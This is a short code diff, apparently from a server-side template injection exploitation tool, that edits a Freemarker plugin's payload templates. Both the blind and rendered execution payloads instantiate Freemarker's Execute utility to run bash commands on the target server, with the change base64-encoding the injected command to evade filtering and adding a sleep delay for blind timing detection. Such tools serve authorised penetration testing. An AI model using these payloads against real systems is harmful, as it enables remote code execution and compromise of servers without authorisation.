@@ -40,11 +40,11 @@ class Freemarker(Plugin):
         # Not using execute here since it's rendered and requires set headers and trailers
         'execute_blind' : {
             'call': 'inject',
-            'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c %(code)s&&{sleep,%(delay)s}") }"""
+            'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c $({base64,--decode}<<<{tr,/+,_-}<<<%(code_b64)s)&&{sleep,%(delay)s}") }"""
         },
         'execute' : {
             'call': 'render',
-            'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("%(code)s") }"""
+            'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c $({base64,--decode}<<<{tr,/+,_-}<<<%(code_b64)s)") }"""
         }
 
     }
